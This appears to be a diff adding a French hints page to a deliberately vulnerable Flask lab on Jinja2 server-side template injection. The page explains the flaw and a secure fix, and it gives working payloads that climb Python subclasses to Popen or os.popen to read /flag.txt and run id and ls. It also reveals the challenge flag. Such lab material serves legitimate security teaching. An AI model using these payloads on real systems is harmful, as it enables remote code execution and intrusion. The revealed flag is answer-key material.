@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ReportGen — Hints C03</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="nav-inner">
+    <a class="brand" href="./">ReportGen</a>
+    <div class="nav-links">
+      <a href="./">Générateur</a>
+      <a href="history">Historique</a>
+      <a href="hints" class="active">Hints</a>
+    </div>
+    <span class="nav-badge">VulnLab C03 — SSTI</span>
+  </div>
+</nav>
+
+<main>
+  <div class="page-wrap page-wrap--narrow">
+
+    <h1>Challenge C03 — SSTI Jinja2</h1>
+    <p class="subtitle">Python 3.11 · Flask · Jinja2</p>
+
+    <p class="intro">
+      L'application utilise <code>render_template_string()</code> pour générer les rapports
+      en injectant directement l'input utilisateur dans un template Jinja2.
+      L'objectif est d'obtenir une <strong>Remote Code Execution</strong> et de lire
+      <code>/flag.txt</code>.
+    </p>
+
+    <h2>Comprendre la vulnérabilité</h2>
+    <div class="info-box" style="margin-bottom:16px">
+      <div class="info-icon">📖</div>
+      <div>
+        <p>En Jinja2, <code>{{ "{{" }} expression {{ "}}" }}</code> évalue du code Python.
+        Si l'input utilisateur est passé directement à <code>render_template_string()</code>
+        (et non en tant que variable), l'attaquant contrôle le template lui-même.</p>
+      </div>
+    </div>
+
+    <div class="code-block">
+# ❌ Vulnérable — l'input EST le template
+render_template_string(template_contenant_input_utilisateur)
+
+# ✅ Sécurisé — l'input est une variable du template
+render_template_string("Bonjour {{ name }}", name=user_input)</div>
+
+    <h2>Indices progressifs</h2>
+
+    <div class="hint-card">
+      <div class="hint-level level-1">Indice 1 — Détecter la SSTI</div>
+      <p>Dans le champ <strong>Corps du rapport</strong>, testez une expression mathématique :</p>
+      <div class="code-block">{{ "{{" }} 7*7 {{ "}}" }}</div>
+      <p>Si la page affiche <code>49</code> (et non <code>{{ "{{7*7}}" }}</code>),
+      le moteur Jinja2 évalue vos expressions. La vulnérabilité est confirmée.</p>
+    </div>
+
+    <div class="hint-card">
+      <div class="hint-level level-2">Indice 2 — Explorer les objets Python</div>
+      <p>Jinja2 donne accès à la hiérarchie des classes Python via <code>__class__</code>
+      et <code>__mro__</code>. Commencez à remonter l'arbre des objets :</p>
+      <div class="code-block">{{ "{{" }} ''.__class__ {{ "}}" }}
+{{ "{{" }} ''.__class__.__mro__ {{ "}}" }}
+{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}</div>
+      <p>La dernière expression liste toutes les sous-classes de <code>object</code>
+      chargées en mémoire — cherchez <code>subprocess.Popen</code> dans la liste.</p>
+    </div>
+
+    <div class="hint-card">
+      <div class="hint-level level-2">Indice 3 — Trouver l'index de Popen</div>
+      <p>L'index de <code>subprocess.Popen</code> varie selon l'environnement.
+      Pour le trouver automatiquement :</p>
+      <div class="code-block">{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() | selectattr('__name__', 'eq', 'Popen') | list {{ "}}" }}</div>
+      <p>Ou en listant avec index pour le repérer visuellement (cherchez <code>Popen</code>) :</p>
+      <div class="code-block">{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[400:450] {{ "}}" }}</div>
+    </div>
+
+    <div class="hint-card">
+      <div class="hint-level level-3">Indice 4 — Exécution de commande (RCE)</div>
+      <p>Une fois l'index de <code>Popen</code> connu (ici <code>INDEX</code>),
+      exécutez une commande shell :</p>
+      <div class="code-block">{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[INDEX](['cat','/flag.txt'],stdout=-1).communicate()[0].decode() {{ "}}" }}</div>
+      <p>Remplacez <code>INDEX</code> par le bon numéro. Vous pouvez aussi utiliser :</p>
+      <div class="code-block">{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[INDEX](['id'],stdout=-1).communicate() {{ "}}" }}
+{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[INDEX](['ls','/'],stdout=-1).communicate() {{ "}}" }}</div>
+    </div>
+
+    <div class="hint-card">
+      <div class="hint-level level-3">Indice 5 — Payload alternatif via config</div>
+      <p>Flask expose l'objet <code>config</code> dans le contexte Jinja2.
+      On peut aussi passer par <code>lipsum</code>, un global Jinja2 :</p>
+      <div class="code-block">{{ "{{" }} config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() {{ "}}" }}
+
+{{ "{{" }} lipsum.__globals__['os'].popen('id').read() {{ "}}" }}</div>
+      <p>Ces payloads sont souvent plus courts et ne dépendent pas d'un index.</p>
+    </div>
+
+    <h2>Flag attendu</h2>
+    <div class="code-block">FLAG{sst1_j1nj4_rc3_p0wn3d}</div>
+
+    <h2>Correction (code sécurisé)</h2>
+    <div class="code-block"># ✅ Ne jamais passer l'input utilisateur comme template
+# Toujours l'injecter en tant que VARIABLE
+
+# Mauvais :
+render_template_string(f"Bonjour {user_input}")
+
+# Bon :
+render_template_string("Bonjour {{ name }}", name=user_input)
+
+# Encore mieux : utiliser des fichiers de template statiques
+render_template('report.html', title=title, body=body)
+
+# Et échapper explicitement les variables dans le template :
+# {{ body | e }}    ← force l'échappement HTML</div>
+
+    <h2>Références</h2>
+    <p>
+      <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-Side_Template_Injection" target="_blank">OWASP — SSTI Testing</a> ·
+      <a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank">PortSwigger SSTI Labs</a> ·
+      <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank">HackTricks — SSTI</a>
+    </p>
+
+  </div>
+</main>
+
+<footer>
+  <div class="footer-inner">
+    ReportGen v2.1 &nbsp;·&nbsp;
+    <span class="vuln-badge">VulnLab C03 — SSTI Jinja2</span> &nbsp;·&nbsp;
+    <a href="./">Retour au générateur</a>
+  </div>
+</footer>
+
+</body>
+</html>
